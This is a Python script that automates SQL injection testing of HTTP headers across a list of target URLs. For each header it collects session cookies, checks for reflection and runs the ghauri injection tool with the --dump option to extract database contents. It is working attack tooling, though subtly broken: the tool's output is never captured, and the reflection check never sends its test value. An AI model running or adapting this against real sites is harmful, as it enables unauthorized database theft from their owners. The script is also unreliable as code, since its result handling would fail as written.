import subprocess
import requests
import urllib3
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers_to_test = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Remote-IP",
    "Origin",
    "Host",
    "X-Real-IP"

]

results = []
log_file = "sqlmap_header_test_log.txt"
json_file = "sqlmap_results.json"

# Load URLs from a file
with open("list.txt", "r") as file:
    urls = [line.strip() for line in file.readlines() if line.strip()]

def log(msg):
    print(msg)
    with open(log_file, "a") as f:
        f.write(msg + "\n")

# Clear previous log
open(log_file, "w").close()

def get_session_and_cookies(url):
    session = requests.Session()
    response = session.get(url, timeout=10, verify=False)
    cookies = session.cookies.get_dict()
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    return session, cookie_str, response

for url in urls:
    try:
        log(f"\n[+] Testing URL: {url}")

        session, cookie_str, base_response = get_session_and_cookies(url)
        if base_response.status_code != 200:
            log(f"[!] Skipping {url} due to status code {base_response.status_code}")
            continue

        body_text = base_response.text.lower()

        base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }

        for header in headers_to_test:
            reflection_test_value = f"REFLECTTEST-{header}"
            test_headers = base_headers.copy()
            test_headers[header] = reflection_test_value

            reflected = reflection_test_value.lower() in body_text
            log(f"[*] Testing header: {header} (Reflected: {reflected})")

            # Set dummy value for injection test
            test_headers = base_headers.copy()
            test_headers[header] = "*"
            sqlmap_headers = "\\r\\n".join([f"{k}: {v}" for k, v in test_headers.items()])
            
            cookie_str = cookie_str.replace("*", "")

            cmd = [
                "ghauri",
                "-u", url,
                "--headers", sqlmap_headers,
                "--cookie", cookie_str,
                "-p", header,
                "--proxy", "http://127.0.0.1:8080",
                "--technique", "BT",
                "--level", "3",
                "--dump",
                "--timeout", "10",
                "--batch"
            ]

            log(f"[*] Running sqlmap on {url} with header: {header}")
            result = subprocess.run(cmd)
            output = result.stdout

            if any(err in output.lower() for err in ["forbidden", "unauthorized", "302 found", "403", "401"]):
                log(f"[!] Detected possible session issue. Refreshing cookies for {url}...")
                session, cookie_str, _ = get_session_and_cookies(url)

            result_entry = {
                "url": url,
                "header": header,
                "reflected": reflected,
                "timestamp": datetime.utcnow().isoformat(),
                "sqlmap_output_snippet": output[-500:]
            }
            results.append(result_entry)

            if "is vulnerable" in output.lower() or "sql injection" in output.lower():
                log(f"[!!!] Potential SQLi found in header: {header}")
            elif reflected:
                log(f"[+] Header {header} reflected but not confirmed vulnerable.")
            else:
                log(f"[-] No issues found with header: {header}")

    except Exception as e:
        log(f"[!] Error testing {url}: {e}")

# Save results to JSON
with open(json_file, "w") as jf:
    json.dump(results, jf, indent=2)

log(f"\n[+] Testing complete. Log: {log_file}, JSON: {json_file}")
